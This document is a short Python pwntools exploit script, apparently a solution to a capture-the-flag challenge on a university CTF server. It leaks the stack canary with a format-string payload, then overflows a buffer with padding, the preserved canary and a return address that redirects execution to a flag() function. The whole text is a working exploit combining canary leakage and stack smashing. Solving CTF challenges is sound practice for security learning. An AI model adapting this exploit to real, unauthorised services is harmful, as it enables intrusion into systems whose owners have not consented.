from pwn import *

# Remote host
r = remote('ctf.idi.ntnu.no', 5000)

# Step 1: leak canary
r.recvuntil(b'Enter your name: ')
r.sendline(b'%p.'*20)  # format string to leak canary

leak = r.recvline()
# Parse canary from leak (example: 0xdeadbeef)
canary = int(leak.split(b'.')[3], 16)  # adjust index if needed
print(f"Canary = {hex(canary)}")

# Step 2: build payload
padding = b'A'*136
payload = padding
payload += p64(canary)  # preserve canary
payload += b'B'*8       # overwrite saved RBP
payload += p64(0x1011c5) # address of flag()

r.recvuntil(b'Name your favourite bird: ')
r.sendline(payload)

r.interactive()

